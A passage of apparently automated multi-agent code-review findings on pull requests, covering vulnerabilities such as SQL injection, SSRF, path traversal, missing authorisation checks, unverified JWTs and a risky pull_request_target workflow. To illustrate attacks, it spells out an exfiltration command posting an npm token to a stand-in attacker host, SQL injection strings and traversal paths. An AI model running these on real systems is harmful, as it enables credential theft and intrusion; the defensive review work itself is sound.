Reflect the actual dashboard origin instead, e.g. add it to the existing `ALLOWED` list used on line 6 and reuse that middleware, or pass a function/array origin that echoes back the specific dashboard origin so the response carries a concrete `Access-Control-Allow-Origin` value with `Vary: Origin`.

findings.title: New dashboardCors export has no test coverage
findings.body: The new `dashboardCors` middleware (wildcard origin combined with credentials:true) is added with no accompanying test. If a future change fixed or altered this configuration (e.g. reverting to a safe origin list), nothing in the diff would fail. Since no repository context showing an existing CORS test suite was retrieved, this may reflect the project's general testing level, but the security-relevant combination here makes an explicit test (e.g. asserting the emitted Access-Control-Allow-Origin/Credentials headers for a request) valuable.

findings.title: Live AcmePay secret key hardcoded, replacing env var lookup
findings.body:
`ACMEPAY_SECRET_KEY` is a literal `acme_live_...` value committed to the repository and assigned to `acmepay.api_key`. The previous implementation read this from `os.environ["ACMEPAY_SECRET_KEY"]`, so this change moves a production payment credential from the runtime environment into version control, where it is readable by anyone with repo access (including CI logs, forks, and clones) and is permanently recorded in git history.

Actions: (1) treat this key as compromised and rotate it at AcmePay immediately; (2) revert to `os.environ["ACMEPAY_SECRET_KEY"]` or a secrets manager lookup; (3) purge the value from git history, since reverting the commit does not remove it.

findings.title: client() now always uses one baked-in key, ignoring environment config
findings.body: `client()` previously resolved `acmepay.api_key` from `os.environ["ACMEPAY_SECRET_KEY"]`, so each deployment (dev, CI, staging, prod) supplied its own key and a missing key failed loudly at call time. After this change the key is a module-level constant, so every environment that imports `billing.acmepay_client` will issue charges against the same `acme_live_...` account \u2014 including CI and local development, where test runs would hit the live gateway. Restore the environment lookup (or route it through whatever config loader the service uses) and keep the key out of source.

findings.title: fake_client() return shape does not match the real client()
findings.body: `client()` sets `acmepay.api_key` and returns the `acmepay` module itself, so callers use it as `client().charge(...)` or similar. `fake_client()` returns a plain dict `{"api_key": TEST_KEY}`, which exposes no methods. Any test that substitutes this fixture for `client()` will fail on attribute access rather than exercise the code under test. Return a stub object that mirrors the module surface the production code actually calls.

findings.title: client() behaviour change has no accompanying test
findings.body: The diff changes client() to set acmepay.api_key from a hardcoded module constant instead of os.environ. The only test-adjacent file added, tests/fixtures/acmepay.py, is a plain fixture (a dict with a test key) with no assertions and is not itself a test — it does not call client() or verify what value ends up in acmepay.api_key. If client() were reverted, broken, or the constant swapped for the wrong value, nothing in this PR would fail.

findings.title: tenant_of returns an unauthenticated, caller-forgeable tenant id
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, so no signature check, no `exp`/`nbf` check, and no algorithm restriction is applied. Any client can mint a token body with an arbitrary `tenant_id` and this function will return it as fact. Unlike `claims_for` on line 7, which verifies against `public_key()` with `algorithms=["RS256"]`, this path establishes no trust at all, so every caller that uses the result to scope data access gets cross-tenant reads/writes.

If the goal is to avoid a key-store round-trip, cache `public_key()` instead of dropping verification. Implement this as `return claims_for(token)["tenant_id"]` (with a cached key), or have the caller reuse the already-verified claims dict rather than decoding a second time.

_Also raised by the security agent:_ tenant_of() reads tenant_id from an unverified JWT

findings.title: New tenant_of() function has no test coverage
findings.body: The new tenant_of function decodes the token without signature verification and extracts tenant_id. There is no test in this diff exercising this function — nothing would fail if it were changed to verify the signature, changed to read a different claim, or broken by a missing 'tenant_id' key raising KeyError. Given this is a security-sensitive code path (deliberately bypassing signature verification), it warrants at least a test asserting correct extraction and behavior on malformed/missing claims.

findings.title: Missing `tenant_id` claim raises KeyError instead of an auth error
findings.body: The claim is accessed with direct subscripting, so a structurally valid token that simply has no `tenant_id` (service token, legacy token, token from another issuer) raises `KeyError` rather than a handled authentication/authorization failure. Depending on the caller this surfaces as a 500 instead of a 401/403. Use `unverified.get("tenant_id")` and handle the `None` case explicitly, or raise a domain-specific error.

findings.title: Public function `tenant_of` lacks documentation of security implications
findings.body: The function `tenant_of(token)` is publicly exported and reads from an unverified JWT token. A caller might assume the token has been verified, or not understand that this function trades off verification for speed. Document why this function exists (avoiding a keystore round-trip) and when it is safe to use—for instance, whether it should only be called on tokens that will be verified later, or in a context where tenant extraction itself does not need to be trusted.

findings.title: Missing ownership check lets any user modify another's payment method
findings.body:
`update_payment_method` resolves `pm_id` (caller-controlled path/query parameter) straight into `PaymentMethod.get(pm_id)` and then writes `body["billing_name"]` and calls `pm.save()` without any authorisation check. `current_user(request)` on line 11 only authenticates — its docstring in `api/auth.py` states explicitly "Authentication only — never authorisation" — and the resulting `user` is never used again, so the function performs no ownership validation at all. Any signed-in user can enumerate or guess `pm_id` values and rewrite the billing name on payment methods belonging to other accounts.

Fix: mirror the read handler on line 6 and insert `require_owner(user, pm)` immediately after the `PaymentMethod.get(pm_id)` on line 12, before any mutation. While there, consider `body.get("billing_name")` with validation, since a missing key currently raises an unhandled `KeyError`.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ body["billing_name"] raises KeyError on a partial update payload

findings.title: No test exercises update_payment_method's authorization behavior
findings.body: update_payment_method is new and, unlike get_payment_method above it, never calls require_owner(user, pm) despite fetching `user`. There is no test in this diff verifying that a non-owner is rejected, or even a basic happy-path test asserting the billing_name update persists. If the missing require_owner call is a bug, nothing added here would fail and catch it.

findings.title: Rate limit removed from unauthenticated password reset endpoint
findings.body:
`request_reset` is an unauthenticated entry point that takes an attacker-supplied `email` and passes it straight to `send_reset_email` (line 2). With `@rate_limit("5/hour")` removed there is no per-caller or per-address bound on how often this can be invoked, which enables: (a) mail-bombing a chosen victim's inbox, (b) high-volume reset-token generation against a single account, widening the window for token guessing or interception, and (c) burning the sending domain's reputation/quota.

The PR rationale — "the email provider already throttles" — does not substitute for this control. Provider-side throttling is typically a global outbound cap on the sending account, not a per-recipient or per-source limit, so it neither stops a targeted victim from being flooded nor stops one abuser from consuming the quota that legitimate resets depend on; hitting that global cap turns abuse into a denial of service for all password resets.

Restore the decorator, or replace it with an equivalent limit keyed on both source IP and target email address before merging.

findings.title: No test guards against reintroducing/removing rate limiting on reset endpoint
findings.body: The diff removes the `@rate_limit("5/hour")` decorator from `request_reset`, a security-relevant behavior change. No test file is included in this diff, so if this removal is wrong (e.g., the email provider's throttling is not an adequate substitute), nothing in the test suite would catch it — there's no evidence any test asserted rate-limiting behavior before or after this change.

findings.title: Preview path skips _confined(), allowing reads outside EXPORT_ROOT
findings.body:
`read_export` on line 14 resolves the caller-supplied `name` through `_confined(name)` before opening it; `read_export_preview` instead does a bare `os.path.join(EXPORT_ROOT, name)`. `os.path.join` does not constrain the result: a `name` of `../../etc/passwd` (or an absolute path, which makes `join` discard `EXPORT_ROOT` entirely) yields a path outside the export directory, and the first 4096 bytes of that file are returned to the caller. The PR description says the preview path "reuses the same layout as download" \u2014 it should also reuse the same confinement. Change line 20 to `path = _confined(name)` so both entry points share one validation point.

_Also raised by the security agent:_ read_export_preview skips _confined, allowing path traversal

findings.title: No test coverage for read_export_preview, which skips path confinement
findings.body: read_export_preview builds its path via os.path.join(EXPORT_ROOT, name) directly rather than calling _confined(name) as the existing read path does (line 14). If this is a bug (likely a path-traversal regression, which is presumably covered by the security specialist), there is no test in this diff that exercises read_export_preview with a traversal-style name (e.g. '../../etc/passwd') or otherwise verifies it enforces the same confinement as the download path. Nothing here would fail if the function silently allowed escaping EXPORT_ROOT.

findings.title: Ownership check removed from bulk_export enables cross-tenant read
findings.body:
`bulk_export` previously called `require_owner(user, report)` for every fetched report; the diff deletes that loop and drops the import. Now `report_ids` — caller-supplied data arriving with the request — is passed straight to `Report.get()` and the resulting objects are serialised via `to_dict()` and returned, with no check that `report.tenant_id == user.tenant_id`.

Authentication is still performed (`current_user(request)`), but authentication is not authorisation: any authenticated user of any tenant can pass arbitrary or enumerated IDs and read another tenant's reports in bulk. The retrieved docstring for `require_owner` states explicitly that "Every object read or mutation of another tenant's data must go through this."

If the loop is a performance problem, keep the control and make it cheap — e.g. fetch with a tenant-scoped query (`Report.query(tenant_id=user.tenant_id, id__in=report_ids)`) so filtering happens in the datastore, and return 403/404 when the returned set is smaller than the requested set. Do not ship the unchecked version.

_Also raised by the correctness agent:_ bulk_export no longer enforces per-object tenant ownership

findings.title: No test guards against cross-tenant access in bulk_export
findings.body: The removal of the require_owner check on line 5-6 is a critical authz regression, and no test in this diff (or apparently in the surrounding suite) exercises bulk_export with report_ids belonging to a different tenant than the requesting user. A test asserting Forbidden is raised for cross-tenant report_ids would have caught this change immediately.

findings.title: Authorization check removal undocumented
findings.body: The `bulk_export` function now returns data without checking ownership, contradicting the documented requirement in `require_owner` that 'every object read or mutation of another tenant's data must go through this.' The function's behavior has changed materially (cross-tenant access is now possible), but no docstring documents this exception to the general rule, leaving callers and maintainers unaware they are operating outside the established authorization pattern.

findings.title: SQL injection: f-string interpolation in search_customers
findings.body:
`term` and `status` are concatenated directly into the SQL string and passed to `execute()` with no `params` argument, so the driver never parameterises them. A value such as `term = "' OR '1'='1"` or `status = "x' UNION SELECT ... --"` closes the quoted literal and appends arbitrary SQL, giving read access to any table the billing DB user can reach (and write/DDL if the driver permits multiple statements).

Fix: keep the values out of the SQL text and let the driver bind them, matching `get_customer` on line 5:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

Note the wildcards belong in the bound value, not the SQL. If `term` should not allow user-supplied `%`/`_` wildcards, escape them before binding.

findings.title: search_customers interpolates input instead of passing params to execute()
findings.body:
`execute` is documented as "Run a parameterised query. `params` must carry every caller value." Here the caller values `term` and `status` are baked into the SQL string and `execute(sql)` is invoked with `params=None`, so nothing is bound. This both violates the helper's stated contract and diverges from `get_customer` on line 5, which correctly passes `(customer_id,)`.

Fix by keeping the values out of the string:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

findings.title: No test coverage for new search_customers function
findings.body: search_customers builds SQL via f-string interpolation and calls execute() with no params, unlike get_customer which uses parameterised queries. No test exercises this function, so neither the query construction logic nor the (unsafe) escaping behaviour would be caught by any test if it were wrong or later 'fixed' incorrectly.

findings.title: Public function lacks parameter and return documentation
findings.body: The `search_customers()` function is a public API in the queries module but carries no docstring explaining what `term` and `status` are, what formats they accept, or what the return value contains. A caller cannot safely use this function without reading the implementation.

findings.title: verify_endpoint bypasses the ALLOWED_HOSTS check used by the send path
findings.body:
The existing sender in this same module resolves the destination host and refuses anything outside `ALLOWED_HOSTS` (lines 8-9) before issuing a request. `verify_endpoint` takes a caller-supplied `url` and hands it straight to `requests.get` with no equivalent guard. Since the PR description says tenants register the URL themselves, a tenant can point `verify_endpoint` at `http://169.254.169.254/...`, `http://localhost:…`, or any internal service and read back the outcome, defeating the control the module already implements. Extract the host-parsing plus allowlist check into a shared helper and call it from both functions; consider also disabling redirects (`allow_redirects=False`), since a permitted host can 302 to an internal one.

_Also raised by the security agent:_ verify_endpoint bypasses the ALLOWED_HOSTS check (SSRF)

findings.title: verify_endpoint raises instead of returning a status for unreachable hosts
findings.body: The function's name and return shape (an int status code) suggest callers use it to decide whether a registered endpoint is usable. But the most common failure for an unverified, user-supplied URL — DNS failure, refused connection, TLS error, timeout — makes `requests.get` raise `requests.RequestException` rather than return a response, so callers receive an exception where they expect an integer. Either catch `requests.RequestException` and return a sentinel (e.g. `None`) with the contract documented, or make the raising behaviour explicit to callers.

findings.title: New verify_endpoint function has no test coverage
findings.body: verify_endpoint is a new public function that makes an outbound GET request and returns a status code, but no test exercises it. If it were broken (e.g. wrong return value, missing error handling, or if the SSRF allowlist check were mistakenly omitted as it appears to be here), nothing would fail.

findings.title: Public function `verify_endpoint` lacks contract documentation
findings.body: The function `verify_endpoint` is a new public API that accepts a URL and returns an HTTP status code, but has no docstring explaining: (1) what constitutes success vs. failure, (2) what status codes are acceptable, (3) what exceptions may be raised (e.g., timeout, connection errors), or (4) intended use cases. A caller could reasonably assume any 2xx response is valid, or conversely that only 200 is valid, without guidance. This mirrors the pattern in the preceding `send_webhook` function which also lacks documentation, but as a new addition to the codebase, this is an opportunity to establish clarity. If status codes outside 2xx range indicate the endpoint is not usable, that contract should be explicit.

findings.title: Customer invoices bucket created with all public access blocks disabled
findings.body:
`aws_s3_bucket.invoices` ("acme-customer-invoices") is created alongside an `aws_s3_bucket_public_access_block` that sets all four guardrails to `false`. That turns off the account-level safety net that stops a public ACL or a public bucket policy from ever taking effect on this bucket. From then on, any principal who can call `PutBucketAcl`/`PutBucketPolicy` on it — a CI role, a future Terraform change, a compromised deploy credential, or a misconfigured SDK call setting `public-read` on an object — silently exposes customer invoices to the internet, with no second control to catch it. The bucket name is a guessable global identifier, so discovery is trivial once anything is made public.

This also appears to be scope creep: the PR describes adding a *public assets bucket for the marketing site*, but this resource holds customer billing data and has nothing to do with marketing assets.

Recommended: set `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` to `true` for `invoices` (or drop the `aws_s3_bucket_public_access_block` resource entirely so the AWS defaults apply), and split this bucket out of a PR about public marketing assets so it gets reviewed on its own merits.

findings.title: New invoices bucket disables all four public-access protections
findings.body:
The PR describes adding a public bucket for marketing assets, but the actual new resources are `aws_s3_bucket.invoices` (`acme-customer-invoices`) plus a public access block with `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all set to `false`. Customer invoices are not marketing assets; nothing in the change explains why this bucket needs public exposure enabled.

Even though no ACL or bucket policy granting public read is present in this diff, turning off all four settings removes the account-level safety net: any subsequent ACL or policy — including one applied by a script, a console click, or a later Terraform change — will take effect immediately and silently. The defaults exist precisely to make that failure mode impossible.

Unless there is a documented requirement for anonymous access to invoices, drop the `aws_s3_bucket_public_access_block.invoices` overrides (or set all four to `true`) and keep the bucket private. If the marketing assets bucket was the intended subject of this change, the invoices resources appear to have been added by mistake and should be removed.

findings.title: HMAC compared with `==` instead of hmac.compare_digest
findings.body:
`verify_acmepay` computes the expected HMAC-SHA256 hex digest and then compares it to the attacker-supplied `header` value with `==`. Python's string equality short-circuits on the first differing byte, so comparison time leaks how many leading hex characters of the signature are correct. An attacker who can submit many webhook requests with chosen bodies and candidate signature headers can recover the expected digest byte-by-byte and forge a valid webhook, without ever learning the secret.

The entry point is the `header` argument — in a webhook verifier this is the caller-supplied signature header (e.g. `X-AcmePay-Signature`) taken straight from the inbound HTTP request; the request routing code is not in this diff or in retrieved context, so that attribution is inferred from the function's shape and its sibling `verify_stripe`. The sink is the `==` on line 12.

Fix: mirror line 7 and use `return hmac.compare_digest(expected, header)`. Note `compare_digest` raises on non-ASCII `str` input, so if `header` can be arbitrary client data, coerce/encode it or guard first.

_Also raised by the correctness agent:_ verify_acmepay uses `==` instead of hmac.compare_digest

findings.title: New verify_acmepay function has no accompanying test
findings.body: The diff adds verify_acmepay using a non-constant-time '==' comparison instead of hmac.compare_digest (unlike verify_stripe). No test file is included in this change, so there is nothing that would fail if this function's comparison logic were wrong or regressed (e.g. if someone 'fixed' it incorrectly, or if the return value semantics changed). Add a test asserting correct verification for matching/non-matching signatures.

findings.title: Full traceback and exception text returned to HTTP clients on 500
findings.body:
`handle()` previously returned a fixed `{"error": "internal error"}` body; it now serialises `str(exc)` and `traceback.format_exc()` into the response. Anything that can trigger an unhandled exception — malformed JSON, an oversized parameter, a bad ID that hits the database — becomes a probe that returns absolute source paths, module and function names, local framework versions, and the surrounding source lines. Exception messages themselves routinely carry sensitive payloads: DB driver errors echo the failing SQL and sometimes the DSN, `requests` errors echo the full internal URL, `KeyError`/`ValueError` from config loading echo key names and values. That is a free map of the internals for an unauthenticated attacker, and it materially shortens the path to a follow-up injection or SSRF.

Keep the generic body on the wire and correlate with the server-side log instead: the `log.exception("request failed")` on line 8 already captures the traceback. Attach a random incident/correlation id to the log record and return only that id, e.g. `return {"error": "internal error", "incident": incident_id}, 500`. If on-call really needs the detail in-band, gate it behind an explicit non-production flag rather than defaulting to on.

Secondary issue on the same line: `traceback.format_exc()` formats whatever exception is currently being handled in this thread, which is not guaranteed to be `exc` if `handle()` is ever called outside an `except` block — so the returned trace can be stale or empty. `traceback.format_exception(exc)` is the correct call if you keep it at all.

_Also raised by the correctness agent:_ traceback.format_exc() yields 'NoneType: None' outside an except block

_Also raised by the correctness agent:_ 500 response body shape/content changed; callers keying on it may break

findings.title: No test verifies handle()'s new response body/status
findings.body: The function handle() now returns exception text and a full traceback in the response body instead of a generic message. No test file is included in this diff, so nothing asserts the returned dict/status code shape. If this were reverted, changed to leak different data, or broken (e.g. KeyError on missing str(exc)), no test would fail.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a credential digest with a single unsalted MD5 pass. MD5 is a fast, GPU-friendly hash with no work factor and no per-user salt, so an attacker who obtains the stored values (database dump, backup, log) can recover reset passwords at billions of guesses per second and can also spot identical values across users via rainbow tables. The same module already establishes the correct primitive on line 7: use `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())` here too (or simply call `hash_password`), and verify with `bcrypt.checkpw` rather than comparing hex digests. If the intent was a single-use reset *token* rather than a password, generate it with `secrets.token_urlsafe` and store a SHA-256 of the token with a short expiry — but the parameter name `raw` and the `hash_password` sibling indicate user-supplied password material.

I cannot see the caller in this diff or in retrieved context, so I cannot confirm whether the output is persisted or compared; if it is written to the users table it is a credential-storage weakness.

findings.title: hash_reset_password returns a format bcrypt verification cannot check
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), while the new `hash_reset_password` returns a 32-char MD5 hex digest. If both write to the same stored password field, any existing verification path built on `bcrypt.checkpw(raw, stored)` will fail (or raise `ValueError: invalid salt`) for a credential written by the reset flow, so a user who resets their password can no longer log in. If the reset value is instead meant to be a short-lived token rather than a stored credential, the name and placement next to `hash_password` are actively misleading. Either route the reset flow through `hash_password` so the stored format stays uniform, or make the distinct purpose explicit and store it in a separate field. (Separately, an unsalted single-round digest is not an acceptable password hash at all; that aspect is worth its own look.)

findings.title: New hashing/checksum functions added with no accompanying tests
findings.body: hash_reset_password and checksum are new, behaviorally significant functions (one produces a password-reset token hash, the other a file integrity checksum) but the diff contains no test file. If hash_reset_password were changed to always return a constant string, or checksum were changed to return the wrong digest for a given input, nothing in this PR would catch it.

findings.title: pull_request_target executes forked PR code with repository secrets
findings.body:
`pull_request_target` runs in the context of the base repository: it has access to `secrets` and a `GITHUB_TOKEN` with write permissions, and it is triggered by pull requests from forks without maintainer approval. This change combines that trigger with `ref: ${{ github.event.pull_request.head.sha }}`, which checks out the *attacker's* commit, and then runs `./scripts/measure.sh` — a file that comes from that checkout and is therefore fully controlled by whoever opened the PR. `NPM_TOKEN` is explicitly placed in that step's environment.

Entry point: the head commit of any fork PR (contents of `scripts/measure.sh`, plus anything it sources such as `package.json` lifecycle scripts). Sink: the `run:` shell step on line 13, executing with `secrets.NPM_TOKEN` and the privileged `GITHUB_TOKEN` in scope. An attacker opens a PR that replaces `measure.sh` with `curl attacker.tld -d "$NPM_TOKEN"`, and also has the token available to push to the base repo.

Remediation options, in order of preference:
- Revert to `pull_request`. Forked PRs do get this signal under `pull_request`; they simply run without secrets. If `measure.sh` genuinely needs `NPM_TOKEN`, that is the thing to fix (e.g. use a public registry for the install, or a two-workflow split).
- If privileged post-processing is required, use the `pull_request` + `workflow_run` pattern: the untrusted build runs unprivileged and uploads an artifact; a separate `workflow_run` workflow holds the secret and never checks out PR code.
- At minimum, if `pull_request_target` must stay, do not check out the head ref and do not execute anything from it — run only scripts from the base branch, and drop `NPM_TOKEN` from the untrusted step.

_Also raised by the correctness agent:_ pull_request_target checks out and runs fork code with secrets

findings.title: json.dumps raises TypeError for contexts the old key accepted
findings.body: The previous key only required context values to be hashable and sortable, so contexts containing `datetime`, `Decimal`, `set`, or arbitrary objects with `__hash__` worked fine. `json.dumps` rejects all of those with `TypeError: Object of type X is not JSON serializable`, and the exception escapes `cached_render` before any rendering happens — so a call that previously rendered successfully now blows up at the cache layer. Either pass `default=repr` (or a custom encoder) to `json.dumps`, or fall back to rendering uncached when serialisation fails.

findings.title: MD5 digest as cache key allows collision-based cache poisoning
findings.body:
`cached_render` previously keyed the cache on the exact value `(template_source, tuple(sorted(context.items())))`, so two different inputs could never share an entry. It now keys on `hashlib.md5(payload).hexdigest()`, which turns an exact comparison into a lossy one. MD5 collisions are cheap to construct (chosen-prefix collisions are minutes of commodity compute), so any caller who can influence `template_source` or `context` can craft a second input whose payload collides with a first one and receive the cached render belonging to that first input \u2014 i.e. another tenant's or user's rendered output \u2014 without `_render` ever running for their input.

Fix: either revert to the exact tuple key (it was already correct and cheaper), or if a fixed-size key is wanted, use `hashlib.sha256(...)`/`hashlib.blake2b(..., digest_size=16)`. As a secondary point, `hashlib.md5()` without `usedforsecurity=False` raises `ValueError` on FIPS-enforcing builds, so this line can also hard-fail at import-time-adjacent call sites in hardened deployments.

findings.title: JSON-based key construction narrows accepted context types, untested
findings.body: The old key was `tuple(sorted(context.items()))`, which only required dict values to be hashable/orderable for sorting. The new key does `json.dumps([template_source, context], sort_keys=True)`, which requires every value in context (and any nested structure) to be JSON-serializable. Any caller passing e.g. a datetime, a custom object, or a set in context would previously work (as long as hashable) and now raises a TypeError. No test in tests/test_cache.py exercises a context with a non-JSON-serializable value, so this regression would go unnoticed until it hits production input.

findings.title: `directory` reaches tar unvalidated; may allow arbitrary path read
findings.body:
`name` is now constrained by `SAFE_NAME.fullmatch` (line 9), but `directory` is passed straight through to `tar` as the source path on line 12 with no validation or containment check. Because it sits after `--`, it cannot be turned into a tar option, and shell metacharacters are inert now that `shell=False` \u2014 so this is not command injection. The remaining exposure is path scope: if any caller lets a user influence `directory`, `create_archive("ok", "/etc")` or `("ok", "../../home/user/.ssh")` produces a readable archive under `/exports/` containing files the requester should not see.

If `directory` is ever caller- or request-influenced, resolve it and assert it stays inside an allowed root, e.g. `root = Path(ALLOWED_ROOT).resolve(); d = Path(directory).resolve(); d.relative_to(root)` (raising on failure), before invoking tar. If `directory` is only ever a trusted constant, a short comment or a type-level guarantee at the call site would make that explicit.

findings.title: New ValueError rejects names that previously worked (dots, length > 64)
findings.body: `SAFE_NAME` permits only `[A-Za-z0-9_-]` and caps length at 64, so names that the old code accepted and archived fine — anything containing a dot (`backup.full`, `2024.01.01`), a space, or longer than 64 characters — now raise `ValueError` from a function that previously only ever raised `CalledProcessError`. That is a new exception type on a path callers currently treat as success. Either widen the character class to cover the naming scheme actually in use (`.` is safe here since traversal needs `/`, and `..` alone would still be caught by requiring at least one non-dot character), or confirm no caller generates such names. Also note `fullmatch` raises `TypeError`, not `ValueError`, if `name` is not a `str`.

findings.title: Only shell=False is asserted; the constructed argv is never checked
findings.body: test_runs_without_a_shell only asserts spy.last_call.kwargs["shell"] is False. Nothing in the test suite inspects spy.last_call.args (or equivalent) to confirm the argv list is `["tar", "-czf", "/exports/<name>.tar.gz", "--", directory]`. If a future edit drops the `--` separator, reorders arguments, mis-formats the output path, or otherwise breaks the command construction, this test would still pass as long as shell=False remains set.

findings.title: directory is now one literal argv element — no splitting or globbing
findings.body: With `shell=True` the old command string let the shell word-split and glob-expand `directory`, so a caller passing `"/srv/a /srv/b"` or `"/srv/data/*"` produced multiple tar operands. Passing the same value as a single list element makes it one literal path, and tar will fail with `No such file or directory` (surfaced as `CalledProcessError` because `check=True`). If any caller relies on multi-path or glob values, change the signature to accept a sequence of directories and splat it into the argv, or document the single-path contract. No callers were retrieved, so this needs a quick grep to confirm.

findings.title: test_renders_empty_invoice asserts nothing
findings.body:
The test body calls `render(Invoice(lines=[]))` and discards the result. It will pass for any return value — empty string, `None`, malformed output — and only fails if `render` raises. If the intent is to pin down the blank-invoice contract, assert on the returned value (e.g. that it still contains the total line, or equals the expected empty-invoice rendering). If the intent really is only "does not raise", say so explicitly so a future reader does not mistake it for coverage of the output.

_Also raised by the tests agent:_ test_renders_empty_invoice has no assertion

findings.title: Mock-only assertion never checks rendered output
findings.body:
test_renders_line_items asserts only that format_line was called twice (fmt.call_count == 2). It never checks what render() actually produced, so a bug that calls format_line correctly but assembles the output wrong (wrong separator, wrong order, dropped line) would pass this test. Assert on the actual rendered string content instead of the mock's call count.

_Also raised by the correctness agent:_ Line-item test only verifies the mock, not the rendered output

findings.title: Failing test deleted with no accompanying implementation change
findings.body:
The PR description says "Fix the rounding and drop the failing test that was asserting the old behaviour", but the diff contains a single file — tests/test_rounding.py — and the only change is the removal of `test_rounds_half_to_even`. No source file implementing `round_cents` is touched. Either the fix was omitted from the commit (in which case the suite now passes only because the assertion that detected the bug is gone), or the behaviour genuinely changed elsewhere and the test should have been *updated* to assert the new expected value for `Decimal("2.345")` rather than deleted. As it stands the exact-half boundary — the one input where rounding mode actually matters — has no coverage at all, while `test_rounds_up_above_half` only covers the strictly-above-half case. Please either include the implementation change, or replace the deleted test with one asserting the new intended result.

_Also raised by the tests agent:_ Test for half-to-even rounding removed with no replacement or fix shown

findings.title: Mock patches notify.transport.deliver, which sender never looks up
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, so `deliver` is resolved once at import time and lives in the `notify.sender` namespace. Patching `notify.transport.deliver` rebinds the attribute on the transport module only; `send_with_retry` continues to call the original function. This test therefore invokes the real transport three times (possible network I/O, slowness, flakiness) and only passes if the real `deliver` happens to return falsy — it does not verify the give-up path at all, and will silently stop testing anything the moment the real transport starts succeeding.

Use the same target as the passing test on line 2: `mocker.patch("notify.sender.deliver", return_value=False)`. Consider also asserting the mock was called exactly `attempts` times, so the retry count is actually covered.

_Also raised by the tests agent:_ Mock patches wrong target; retry test never uses the stub

_Also raised by the docs agent:_ Test will not exercise the intended retry path

findings.title: Test patches wrong target; contradicts existing docstring
findings.body: The test at line 7 patches `notify.transport.deliver`, but the module-level docstring in notify/sender.py explicitly states: "Note the `from ... import`: `deliver` is bound into this module's namespace at import time, so patching `notify.transport.deliver` does not affect it." The working test above (line 2) correctly patches `notify.sender.deliver`. This test will not exercise the retry path as intended because the patch target is ineffective.

findings.title: csv_rows joins fields without calling csv_escape
findings.body:
`csv_rows` renders each field with `str(r.get(c, ""))` and joins on `,`, never passing the value through the `csv_escape` helper defined immediately below it. Any field value that itself contains a comma or a double quote will split into extra columns (or corrupt quoting) in the emitted row, so a party who controls a single record field can control the column layout of the whole line — and therefore the values another system reads back out of that column.

Fix: apply the escaper in the comprehension, e.g. `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`, or drop the hand-rolled writer in favour of `csv.writer`, which also handles embedded newlines (which `csv_escape` does not quote either). While you are there, consider prefixing values starting with `=`, `+`, `-` or `@` to avoid spreadsheet formula injection if these files are opened in Excel/Sheets.

I cannot see the caller of `csv_rows` in this diff or in the retrieved context, so I cannot confirm that `rows` carries untrusted data; confidence reflects that.

_Also raised by the correctness agent:_ csv_escape misses newlines and raises TypeError on non-str input

findings.title: csv_rows never calls csv_escape, producing malformed CSV
findings.body: `csv_rows` joins raw `str(...)` values with commas and never routes them through `csv_escape`, which is defined three lines below for exactly this purpose. Any cell value containing a comma or a double quote (a free-text description, a name like "Doe, Jane", a numeric string with thousands separators) emits an extra field and silently shifts every subsequent column for that row — a wrong result rather than a visible failure. Wrap the conversion: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. The same argument applies to `csv_header`, which also joins column names unescaped.

findings.title: dump_streaming requires a sized, sliceable rows and breaks on chunk_size=0
findings.body: The function is named and documented as streaming, but `len(rows)` and `rows[i : i + chunk_size]` require a materialised sequence — passing a generator or any iterator (the natural thing to hand a streaming API) raises `TypeError` rather than streaming. Separately, `chunk_size=0` makes `range(0, n, 0)` raise `ValueError: range() arg 3 must not be zero`, and a negative `chunk_size` silently yields nothing. Either iterate with `itertools.islice` over an iterator, or validate `chunk_size >= 1` and document that `rows` must be a sequence.

findings.title: New csv_rows/csv_escape logic has no tests
findings.body: csv_header has a dedicated test in the repo, but the new csv_rows and csv_escape functions—which contain actual logic (column ordering, quoting/escaping rules)—are untested. A bug in escaping (e.g. wrong quote logic) would not be caught.

findings.title: New test can't catch expiry-window bugs and is time-dependent
findings.body:
test_token_issued_today_is_valid calls issue_token() and then is_expired(token.expires_at) with no explicit `now`, relying on the real system clock. A freshly issued token will be 'not expired' under almost any correct or incorrect implementation of the expiry window (the whole point of the PR, per its title, is the boundary near expiry) — this test never gets close to that boundary, so an off-by-one or boundary bug in is_expired would not be caught. Additionally, `token.issued_at.date() == datetime.now(timezone.utc).date()` compares only dates and will spuriously fail if the test happens to run across a UTC midnight boundary between token issuance and the assertion, making the test flaky independent of any code defect — ironic given the PR is named 'flaky'. Consider passing an explicit `now` near token.expires_at (e.g. one second before expiry) to actually test the window, and avoid date()-only comparisons across real wall-clock calls.

_Also raised by the correctness agent:_ Date-equality assertion races the UTC midnight boundary

findings.title: No test covers the expired-coupon rejection path
findings.body: apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test updated (test_apply_coupon_reduces_total) uses a coupon expiring tomorrow, exercising just the non-expired branch. If the comparison were inverted, the exception type wrong, or the check silently removed, no test would fail. Add a test that passes an expired coupon and asserts CouponExpired is raised (and ideally that order.total is unchanged).

findings.title: Comparison breaks on None or naive `expires_at`
findings.body: `coupon.expires_at < datetime.now(timezone.utc)` assumes `expires_at` is always a timezone-aware datetime. Two reachable inputs break it: a coupon with no expiry (`expires_at is None`) raises `TypeError: '<' not supported between instances of 'NoneType' and 'datetime'`, and a naive datetime (e.g. loaded from a DB column without tz, or built by test helpers like `tomorrow()`) raises `TypeError: can't compare offset-naive and offset-aware datetimes`. Both surface as an opaque TypeError from the billing path instead of a coupon being accepted or a `CouponExpired`. Guard explicitly: treat `None` as never-expiring, and normalise naive values to UTC before comparing.

findings.title: apply_coupon() contract changed; docstring missing
